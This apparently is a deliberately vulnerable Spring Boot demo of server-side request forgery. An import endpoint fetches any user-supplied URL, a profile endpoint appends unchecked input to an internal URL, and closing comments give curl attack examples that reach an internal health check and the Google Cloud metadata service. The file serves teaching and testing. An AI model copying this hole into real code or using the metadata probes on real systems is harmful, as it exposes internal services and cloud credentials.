package com.example.ssrfdemo;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.client.RestTemplate;

import java.net.URI;

@SpringBootApplication
public class SsrfDemoApplication {

    public static void main(String[] args) {
        SpringApplication.run(SsrfDemoApplication.class, args);
    }

    @Bean
    public RestTemplate restTemplate() {
        return new RestTemplate();
    }
}

@RestController
@RequestMapping("/api")
class UserController {

    private final RestTemplate restTemplate;

    public UserController(RestTemplate restTemplate) {
        this.restTemplate = restTemplate;
    }

    @GetMapping("/user/{username}")
    public String getUserProfile(@PathVariable String username) {
        // 模拟从外部服务获取用户资料
        String externalServiceUrl = "http://external-service/users/" + username;
        return restTemplate.getForObject(externalServiceUrl, String.class);
    }

    @PostMapping("/import")
    public String importData(@RequestParam String url) {
        // 存在SSRF漏洞的代码
        try {
            // 直接使用用户输入的URL发起请求
            String result = restTemplate.getForObject(new URI(url), String.class);
            return "Imported data: " + result;
        } catch (Exception e) {
            return "Import failed: " + e.getMessage();
        }
    }

    // 模拟内部健康检查接口
    @GetMapping("/health/internal")
    public String internalHealthCheck() {
        return "Internal metrics: OK";
    }
}

// 攻击示例：
// curl -X POST "http://localhost:8080/api/import?url=http://localhost:8080/api/health/internal"
// curl -X POST "http://localhost:8080/api/import?url=http://metadata.google.internal/computeMetadata/v1/project/project-id"